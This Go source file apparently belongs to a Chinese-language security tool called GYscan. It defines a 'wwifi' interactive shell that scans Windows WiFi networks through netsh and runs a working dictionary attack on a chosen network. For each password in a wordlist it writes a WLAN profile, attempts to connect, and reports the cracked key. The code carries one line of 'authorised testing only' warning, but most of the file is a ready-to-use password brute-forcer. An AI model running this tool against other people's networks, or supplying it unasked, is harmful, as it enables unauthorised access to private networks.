package cli

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"GYscan/internal/utils"

	"github.com/spf13/cobra"
)

// wwifiCmd represents the wwifi command
var wwifiCmd = &cobra.Command{
	Use:   "wwifi",
	Short: "Windows系统WiFi破解工具",
	Long: `Windows系统WiFi破解工具 - 用于WiFi网络扫描和连接
警告：仅用于授权测试，严禁未授权使用！`,
	Run: func(cmd *cobra.Command, args []string) {
		// 进入wwifi交互shell
		startWWIFIShell()
	},
}

// WiFi网络信息结构
type WiFiNetwork struct {
	Index    int
	SSID     string
	Signal   string
	Security string
	BSSID    string
}

// 可用的WiFi网络列表
var wifiNetworks []WiFiNetwork

// parseCommandLine 解析命令行，正确处理带引号的参数
func parseCommandLine(input string) []string {
	var args []string
	var current strings.Builder
	var inQuotes bool
	var quoteChar rune

	for _, r := range input {
		switch {
		case r == '"', r == '\'':
			if !inQuotes {
				// 开始引号
				inQuotes = true
				quoteChar = r
			} else if r == quoteChar {
				// 结束引号
				inQuotes = false
				quoteChar = 0
			} else {
				// 引号内的相同引号，作为普通字符
				current.WriteRune(r)
			}
		case r == ' ' && !inQuotes:
			// 空格分隔符，添加当前参数
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		default:
			// 普通字符
			current.WriteRune(r)
		}
	}

	// 添加最后一个参数
	if current.Len() > 0 {
		args = append(args, current.String())
	}

	return args
}

// startWWIFIShell 启动wwifi交互shell
func startWWIFIShell() {
	fmt.Println("进入Windows WiFi破解shell")
	fmt.Println("输入 --help 查看帮助信息")
	fmt.Println()

	// 创建扫描仪
	scanner := bufio.NewScanner(os.Stdin)

	// 主循环
	for {
		// 显示提示符
		fmt.Print("wwifi>> ")

		// 读取输入
		if !scanner.Scan() {
			break
		}

		// 处理输入
		input := scanner.Text()
		if input == "" {
			continue
		}

		// 分割命令和参数，支持带引号的参数
		parts := parseCommandLine(input)
		if len(parts) == 0 {
			continue
		}

		// 提取命令
		cmd := parts[0]
		args := parts[1:]

		// 处理命令
		switch strings.ToLower(cmd) {
		case "scan":
			handleScanCommand(args)
		case "connect":
			handleConnectCommand(args)
		case "show":
			handleShowCommand(args)
		case "--help", "help":
			showWWIFIHelp()
		case "exit", "quit", "q":
			fmt.Println("退出wwifi shell")
			return
		default:
			fmt.Printf("未知命令: %s\n", cmd)
			fmt.Println("输入 --help 查看帮助信息")
		}
	}

	// 检查错误
	if err := scanner.Err(); err != nil {
		utils.ErrorPrint("读取输入时出错: %v\n", err)
	}
}

// handleScanCommand 处理scan命令
func handleScanCommand(args []string) {
	fmt.Println("正在扫描WiFi网络...")

	// 清空之前的扫描结果
	wifiNetworks = []WiFiNetwork{}

	// 构建netsh命令参数
	cmdArgs := []string{"wlan", "show", "networks", "mode=bssid"}

	// 如果提供了接口参数，添加到命令中
	if len(args) > 1 {
		cmdArgs = append(cmdArgs, "interface=", args[1])
	}

	// 使用netsh命令扫描WiFi
	cmd := exec.Command("netsh", cmdArgs...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		utils.ErrorPrint("扫描失败: %v\n", err)
		fmt.Println("请确保以管理员身份运行程序")
		fmt.Println("命令输出:", string(output))
		return
	}

	// 解析扫描结果
	parseWiFiScanResult(string(output))

	// 显示扫描结果
	showWiFiNetworks()
}

// parseWiFiScanResult 解析WiFi扫描结果
func parseWiFiScanResult(output string) {
	lines := strings.Split(output, "\n")
	var currentWiFi WiFiNetwork
	var index int = 1
	var inSSIDSection bool = false
	var inBSSIDSection bool = false

	for _, line := range lines {
		line = strings.TrimSpace(line)

		// 跳过空行
		if line == "" {
			continue
		}

		// 跳过接口名称行
		if strings.HasPrefix(line, "接口名称") {
			continue
		}

		// 检查是否是新的SSID
		if strings.HasPrefix(line, "SSID ") {
			// 如果当前有完整的WiFi信息，保存
			if currentWiFi.SSID != "" && currentWiFi.BSSID != "" {
				wifiNetworks = append(wifiNetworks, currentWiFi)
				index++
			}

			// 重置当前WiFi
			currentWiFi = WiFiNetwork{}
			currentWiFi.Index = index
			inSSIDSection = true
			inBSSIDSection = false

			// 提取SSID
			ssidPart := strings.SplitN(line, ":", 2)
			if len(ssidPart) > 1 {
				currentWiFi.SSID = strings.TrimSpace(ssidPart[1])
			}
		} else if inSSIDSection && strings.HasPrefix(line, "BSSID ") {
			// 如果之前已经有BSSID信息，保存当前WiFi
			if currentWiFi.BSSID != "" {
				wifiNetworks = append(wifiNetworks, currentWiFi)
				index++
				// 保存当前SSID
				ssid := currentWiFi.SSID
				// 创建新的WiFi对象
				currentWiFi = WiFiNetwork{}
				currentWiFi.Index = index
				currentWiFi.SSID = ssid
			}

			inBSSIDSection = true

			// 提取BSSID
			bssidPart := strings.SplitN(line, ":", 2)
			if len(bssidPart) > 1 {
				currentWiFi.BSSID = strings.TrimSpace(bssidPart[1])
			}
		} else if inBSSIDSection && strings.Contains(line, "信号") {
			// 提取信号强度
			signalPart := strings.SplitN(line, ":", 2)
			if len(signalPart) > 1 {
				currentWiFi.Signal = strings.TrimSpace(signalPart[1])
			}
		} else if inBSSIDSection && strings.Contains(line, "身份验证") {
			// 提取安全类型
			securityPart := strings.SplitN(line, ":", 2)
			if len(securityPart) > 1 {
				currentWiFi.Security = strings.TrimSpace(securityPart[1])
			}
		} else if inBSSIDSection && strings.Contains(line, "加密") {
			// 提取加密类型（可选）
			// 这里可以添加加密类型的处理
		}
	}

	// 添加最后一个WiFi
	if currentWiFi.SSID != "" && currentWiFi.BSSID != "" {
		wifiNetworks = append(wifiNetworks, currentWiFi)
	}
}

// showWiFiNetworks 显示WiFi网络列表
func showWiFiNetworks() {
	if len(wifiNetworks) == 0 {
		fmt.Println("没有找到WiFi网络")
		return
	}

	fmt.Println("可用的WiFi网络:")
	fmt.Println("Index  SSID                     Signal  Security   BSSID")
	fmt.Println("=====  ========================  ======  =========  ==============")

	for _, wifi := range wifiNetworks {
		fmt.Printf("%4d  %-26s  %-6s  %-10s  %s\n",
			wifi.Index,
			truncateString(wifi.SSID, 26),
			wifi.Signal,
			wifi.Security,
			wifi.BSSID)
	}
}

// handleConnectCommand 处理connect命令
func handleConnectCommand(args []string) {
	if len(args) < 1 {
		fmt.Println("用法: connect [WiFi序号|\"WiFi名称\"] [--password 密码] [-i 网卡名称] [--speed]")
		return
	}

	// 解析WiFi序号或名称
	var targetWiFi WiFiNetwork
	var found bool = false

	// 尝试解析为序号
	index, err := strconv.Atoi(args[0])
	if err == nil {
		// 是序号，检查范围
		if index >= 1 && index <= len(wifiNetworks) {
			targetWiFi = wifiNetworks[index-1]
			found = true
		}
	} else {
		// 是名称，查找匹配的WiFi
		wifiName := args[0]
		// 移除可能的引号
		wifiName = strings.Trim(wifiName, `"'`)

		for _, wifi := range wifiNetworks {
			if wifi.SSID == wifiName {
				targetWiFi = wifi
				found = true
				break
			}
		}
	}

	// 检查是否找到WiFi
	if !found {
		fmt.Printf("未找到WiFi: %s\n", args[0])
		return
	}

	// 解析参数
	var password string
	var isDictionary bool = false
	var interfaceName string = "*" // 默认使用所有接口
	var useSpeedMode bool = false  // 是否使用speed模式

	// 解析参数
	i := 1
	for i < len(args) {
		if args[i] == "--password" {
			if i+1 >= len(args) {
				fmt.Println("用法: connect [WiFi序号|\"WiFi名称\"] [--password 密码] [-i 网卡名称] [--speed]")
				return
			}
			password = args[i+1]
			i += 2
		} else if args[i] == "-i" {
			if i+1 >= len(args) {
				fmt.Println("用法: connect [WiFi序号|\"WiFi名称\"] [--password 密码] [-i 网卡名称] [--speed]")
				return
			}
			interfaceName = args[i+1]
			i += 2
		} else if args[i] == "--speed" {
			// 开启speed模式
			useSpeedMode = true
			i += 1
		} else {
			fmt.Printf("未知参数: %s\n", args[i])
			fmt.Println("用法: connect [WiFi序号|\"WiFi名称\"] [--password 密码] [-i 网卡名称] [--speed]")
			return
		}
	}

	// 检查密码是否提供
	if password == "" {
		fmt.Println("用法: connect [WiFi序号|\"WiFi名称\"] [--password 密码] [-i 网卡名称] [--speed]")
		return
	}

	// 检查是否是字典文件
	if strings.HasSuffix(strings.ToLower(password), ".txt") || strings.HasSuffix(strings.ToLower(password), ".lst") {
		isDictionary = true
	}

	// 处理连接
	if isDictionary {
		// 字典破解
		handleDictionaryAttack(targetWiFi, password, interfaceName, useSpeedMode)
	} else {
		// 单次连接尝试
		attemptWiFiConnection(targetWiFi, password, interfaceName)
	}
}

// handleDictionaryAttack 处理字典攻击
func handleDictionaryAttack(wifi WiFiNetwork, dictPath string, interfaceName string, useSpeedMode bool) {
	fmt.Printf("[INFO] 开始对WiFi %s 进行字典破解...\n", wifi.SSID)
	fmt.Printf("[INFO] 目标WiFi: %s\n", wifi.SSID)
	fmt.Printf("[INFO] BSSID: %s\n", wifi.BSSID)
	fmt.Printf("[INFO] 安全类型: %s\n", wifi.Security)
	fmt.Printf("[INFO] 网卡名称: %s\n", interfaceName)
	fmt.Printf("[INFO] 字典文件: %s\n", dictPath)
	fmt.Printf("[INFO] 使用单线程破解\n")

	// 打开字典文件
	file, err := os.Open(dictPath)
	if err != nil {
		utils.ErrorPrint("[ERROR] 无法打开字典文件: %v\n", err)
		return
	}
	defer file.Close()

	// 计算字典文件大小
	fileInfo, _ := file.Stat()
	fmt.Printf("[INFO] 字典文件大小: %.2f MB\n", float64(fileInfo.Size())/1024/1024)

	// 输出speed模式信息
	if useSpeedMode {
		fmt.Printf("[INFO] 已开启speed模式，每15秒发送一次连接请求\n")
	}

	// 重置文件指针
	file.Seek(0, 0)

	// 创建扫描仪
	scanner := bufio.NewScanner(file)
	attempt := 0

	// 逐行尝试密码
	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		if password == "" {
			continue
		}

		attempt++
		fmt.Printf("[INFO] 尝试 %d: 密码='%s'\n", attempt, password)

		// 尝试连接
		if attemptWiFiConnection(wifi, password, interfaceName) {
			fmt.Printf("[SUCCESS] 破解成功!\n")
			fmt.Printf("[SUCCESS] WiFi名称: %s\n", wifi.SSID)
			fmt.Printf("[SUCCESS] 密码: %s\n", password)
			fmt.Printf("[SUCCESS] 网卡名称: %s\n", interfaceName)
			fmt.Printf("[SUCCESS] 尝试次数: %d\n", attempt)
			return
		} else {
			fmt.Printf("[INFO] 尝试 %d: 密码='%s' 连接失败\n", attempt, password)
		}

		// 如果开启了speed模式，每15秒发送一次请求
		if useSpeedMode {
			fmt.Printf("[INFO] speed模式: 等待15秒后进行下一次尝试...\n")
			time.Sleep(15 * time.Second)
		}
	}

	// 检查字典文件读取错误
	if err := scanner.Err(); err != nil {
		utils.ErrorPrint("[ERROR] 读取字典文件时出错: %v\n", err)
		return
	}

	fmt.Printf("[INFO] 字典破解完成\n")
	fmt.Printf("[FAILED] 未找到正确密码，共尝试 %d 次\n", attempt)
}

// checkWiFiConnection 检查WiFi是否真正连接成功
func checkWiFiConnection(wifiName, interfaceName string) bool {
	// 多次检查连接状态，确保稳定连接
	for i := 0; i < 3; i++ {
		checkCmd := exec.Command("netsh", "wlan", "show", "interfaces", "interface=", interfaceName)
		checkOutput, err := checkCmd.CombinedOutput()
		if err != nil {
			continue
		}

		checkResult := string(checkOutput)
		lowerResult := strings.ToLower(checkResult)

		// 检查是否包含WiFi名称和已连接状态
		if strings.Contains(lowerResult, strings.ToLower(wifiName)) &&
			strings.Contains(lowerResult, "已连接") {
			// 进一步检查是否有有效的信号强度
			if strings.Contains(lowerResult, "信号") &&
				!strings.Contains(lowerResult, "0%") {
				return true
			}
		}

		// 等待一段时间再检查
		time.Sleep(500 * time.Millisecond)
	}

	return false
}

// attemptWiFiConnection 尝试连接WiFi
func attemptWiFiConnection(wifi WiFiNetwork, password string, interfaceName string) bool {
	// 1. 检查密码长度，WPA/WPA2密码长度需在8-63字符之间
	if len(password) < 8 || len(password) > 63 {
		fmt.Printf("[INFO] 密码长度无效，跳过尝试: %s\n", password)
		return false
	}

	// 2. 首先断开可能的连接，确保干净的连接环境
	fmt.Printf("[INFO] 正在断开当前连接...\n")
	disconnectCmd := exec.Command("netsh", "wlan", "disconnect", "interface=", interfaceName)
	disconnectCmd.Run()         // 忽略断开连接的结果
	time.Sleep(1 * time.Second) // 等待断开完成

	// 3. 创建临时XML配置文件，根据安全类型动态生成
	authType := "WPA2PSK"
	if wifi.Security == "WPA3" {
		authType = "WPA3SAE"
	} else if strings.Contains(wifi.Security, "WPA2") {
		authType = "WPA2PSK"
	} else if strings.Contains(wifi.Security, "WPA") {
		authType = "WPAPSK"
	}

	xmlConfig := fmt.Sprintf(`<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
	<name>%s</name>
	<SSIDConfig>
		<SSID>
			<name>%s</name>
		</SSID>
	</SSIDConfig>
	<connectionType>ESS</connectionType>
	<connectionMode>auto</connectionMode>
	<MSM>
		<security>
			<authEncryption>
				<authentication>%s</authentication>
				<encryption>AES</encryption>
				<useOneX>false</useOneX>
			</authEncryption>
			<sharedKey>
				<keyType>passPhrase</keyType>
				<protected>false</protected>
				<keyMaterial>%s</keyMaterial>
			</sharedKey>
		</security>
	</MSM>
</WLANProfile>`, wifi.SSID, wifi.SSID, authType, password)

	// 写入临时文件
	tempFile := fmt.Sprintf("%s.xml", wifi.SSID)
	err := os.WriteFile(tempFile, []byte(xmlConfig), 0644)
	if err != nil {
		utils.ErrorPrint("[ERROR] 创建临时配置文件失败: %v\n", err)
		return false
	}
	defer os.Remove(tempFile)

	// 4. 添加WiFi配置
	fmt.Printf("[INFO] 正在添加WiFi配置...\n")
	addCmd := exec.Command("netsh", "wlan", "add", "profile", "filename=", tempFile, "interface=", interfaceName, "user=", "all")
	addOutput, err := addCmd.CombinedOutput()
	if err != nil {
		// 忽略已存在的错误
		addResult := string(addOutput)
		if !strings.Contains(strings.ToLower(addResult), "已存在") {
			fmt.Printf("[INFO] WiFi配置添加异常: %s\n", strings.TrimSpace(addResult))
		}
	}

	// 5. 尝试连接
	fmt.Printf("[INFO] 正在尝试连接WiFi: %s\n", wifi.SSID)
	connectCmd := exec.Command("netsh", "wlan", "connect",
		"name=", wifi.SSID,
		"interface=", interfaceName)

	output, err := connectCmd.CombinedOutput()
	connectResult := string(output)
	fmt.Printf("[INFO] 连接命令结果: %s\n", strings.TrimSpace(connectResult))

	// 6. 等待连接建立
	fmt.Printf("[INFO] 等待连接建立...\n")
	time.Sleep(2 * time.Second)

	// 7. 严格检查连接状态，确保真正连接成功
	if checkWiFiConnection(wifi.SSID, interfaceName) {
		fmt.Printf("[INFO] WiFi连接验证成功: %s\n", wifi.SSID)
		return true
	} else {
		// 连接失败，再次确认状态
		checkCmd := exec.Command("netsh", "wlan", "show", "interfaces", "interface=", interfaceName)
		checkOutput, _ := checkCmd.CombinedOutput()
		fmt.Printf("[INFO] 最终连接状态: %s\n", strings.TrimSpace(string(checkOutput)))
		return false
	}
}

// handleShowCommand 处理show命令
func handleShowCommand(args []string) {
	// 显示可用的WiFi网络接口
	cmd := exec.Command("netsh", "wlan", "show", "interfaces")
	output, err := cmd.CombinedOutput()
	if err != nil {
		utils.ErrorPrint("获取WiFi接口信息失败: %v\n", err)
		fmt.Println("请确保以管理员身份运行程序")
		return
	}

	fmt.Println("可用的WiFi连接设备:")
	fmt.Println(string(output))
}

// showWWIFIHelp 显示wwifi帮助信息
func showWWIFIHelp() {
	fmt.Println("wwifi shell 帮助信息")
	fmt.Println("====================")
	fmt.Println()
	fmt.Println("可用命令:")
	fmt.Println()
	fmt.Println("  scan [接口名称]           扫描WiFi网络")
	fmt.Println("  connect <序号> --password <密码> [-i 接口名称] [--speed]  连接指定WiFi")
	fmt.Println("    <序号>: WiFi网络的索引编号")
	fmt.Println("    <密码>: 可以是明文密码或字典文件(.txt/.lst)")
	fmt.Println("    -i: 指定要使用的WiFi网络接口")
	fmt.Println("    --speed: 开启speed模式，每15秒发送一次连接请求")
	fmt.Println("  show                      显示可用的WiFi连接设备")
	fmt.Println("  --help, help              显示帮助信息")
	fmt.Println("  exit, quit, q             退出wwifi shell")
	fmt.Println()
	fmt.Println("示例:")
	fmt.Println("  scan                      扫描附近WiFi网络")
	fmt.Println("  scan WLAN                 使用指定接口扫描WiFi网络")
	fmt.Println("  connect 1 --password 12345678  连接序号为1的WiFi")
	fmt.Println("  connect \"OnePlus 10 Pro\" --password 12345678  通过名称连接WiFi")
	fmt.Println("  connect 1 --password 12345678 -i WLAN  使用指定接口连接WiFi")
	fmt.Println("  connect 2 --password passwords.txt  使用字典破解序号为2的WiFi")
	fmt.Println("  connect 2 --password passwords.txt --speed  使用speed模式进行字典破解")
	fmt.Println("  show                      显示WiFi连接设备")
}

func init() {
	// wwifi命令不需要额外参数
}
